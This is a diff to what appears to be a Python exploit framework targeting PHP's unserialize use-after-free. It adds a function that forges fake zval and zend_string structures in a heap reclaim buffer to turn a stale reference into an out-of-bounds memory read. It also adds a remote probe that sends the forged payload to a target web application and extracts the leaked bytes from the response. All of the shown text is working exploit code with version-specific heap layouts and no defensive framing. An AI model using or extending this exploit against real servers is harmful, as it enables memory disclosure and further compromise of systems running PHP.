@@ -271,10 +271,12 @@ class Oracle:
         return struct.unpack("<I", self.read(addr, 4))[0]
 
     def unserialize_data(self) -> int:
-        return self.u64(self.bg + BG_UNSERIALIZE_DATA_OFF)
+        data_off, _level_off = _bg_offsets(self.version)
+        return self.u64(self.bg + data_off)
 
     def unserialize_level(self) -> int:
-        return self.u32(self.bg + BG_UNSERIALIZE_LEVEL_OFF)
+        _data_off, level_off = _bg_offsets(self.version)
+        return self.u32(self.bg + level_off)
 
     def chunk_base(self, addr: int) -> int | None:
         for start, end, perms in self.maps:
@@ -688,6 +690,76 @@ def _build_primitive_payload(d: int, k: int, size: int, value: int,
     struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 4)
     struct.pack_into("<q", forged, k + 0x400, 0)
     return bytes(forged)
+
+
+def _build_leak_payload(d: int, k: int, size: int, read_len: int,
+                        layout: dict | None = None) -> bytes:
+    """Forged reclaim buffer that turns the stale ``r`` into a long OOB string.
+
+    The string-slot leak needs the freed k1 slot to be reused by the reclaim
+    buffer, which depends on the allocator of the build.  This variant does
+    not: R:2 resolves to a fake IS_STRING zval planted next to the fake
+    struct, whose zend_string also lives inside the reclaim buffer, so
+    echoing ``r`` dumps ``read_len`` bytes starting inside the buffer and
+    running through the chunk.  Only the reclaim geometry (which the same
+    sweep discovers) is required.
+    """
+    layout = layout or DEFAULT_LAYOUT
+    uns = layout["unserialize_data"]
+    zval = layout["zval"]
+    string = layout["zend_string"]
+    ve = layout["var_entries"]
+    forged = bytearray(size)
+    if uns.get("legacy"):
+        # PHP <= 7.3: the fake var_entries starts at the head of the buffer
+        # (PHP 7 frees every block var_destroy walks), and the dtor lists
+        # stay NULL so nothing dereferences them.
+        buffer_start = d - k
+        struct.pack_into("<Q", forged, k + uns["first"], buffer_start)
+        struct.pack_into("<Q", forged, k + uns["last"], buffer_start)
+        struct.pack_into("<Q", forged, k + uns["first_dtor"], 0)
+        struct.pack_into("<Q", forged, k + uns["last_dtor"], 0)
+        struct.pack_into("<Q", forged, ve["data"] + 8, d + 0x300)
+        struct.pack_into("<q", forged, ve["used_slots"], 2)
+    else:
+        entries = uns["entries"]
+        data_base = entries + ve["data"]
+        struct.pack_into("<Q", forged, k + uns["last"], d + entries)
+        struct.pack_into("<Q", forged, k + uns["first_dtor"], d + 0x600)
+        struct.pack_into("<Q", forged, k + uns["last_dtor"], d + 0x600)
+        struct.pack_into("<q", forged, k + uns["max_depth"], 64)
+        struct.pack_into("<q", forged, k + entries + ve["used_slots"], 2)
+        struct.pack_into("<Q", forged, k + data_base + 8, d + 0x300)
+        struct.pack_into("<q", forged, k + 0x600, 0)      # empty dtor list
+    # fake zval at d+0x300: IS_STRING_EX -> forged zend_string at d+0x400
+    struct.pack_into("<Q", forged, k + 0x300, d + 0x400)
+    struct.pack_into("<I", forged, k + 0x300 + zval["type_info"], 0x106)
+    # forged zend_string at d+0x400: the read starts right after its header
+    struct.pack_into("<I", forged, k + 0x400 + string["gc"], 1)
+    struct.pack_into("<I", forged, k + 0x400 + string["gc"] + 4, 6)
+    struct.pack_into("<Q", forged, k + 0x400 + string["len"], read_len)
+    content_off = k + 0x400 + string["val"]
+    fill = min(read_len, size - content_off)
+    if fill > 0:
+        forged[content_off:content_off + fill] = b"Q" * fill
+    return bytes(forged)
+
+
+def _remote_leak_probe(base: str, builder: str, version: str, chunk: int,
+                       d_off: int, k: int, size: int, pads: list[int],
+                       read_len: int | None = None) -> bytes | None:
+    """Consume with the direct-leak payload and return the reflected bytes."""
+    chainapp = Target(base + PATHS["app"])
+    layout = _layout(version)
+    read_len = read_len or LEAK_READ_LEN
+    _remote_arm_and_normalize(base, builder, size, pads, size)
+    forged = _build_leak_payload(chunk + d_off, k, size, read_len, layout)
+    _status, _headers, body = _consume_b(chainapp, forged, pads)
+    raw = _dechunk(body)
+    index = raw.find(b"r\t")
+    if index < 0:
+        return None
+    return raw[index + 2:index + 2 + read_len]
 
 
 def cmd_primitive(args) -> int:
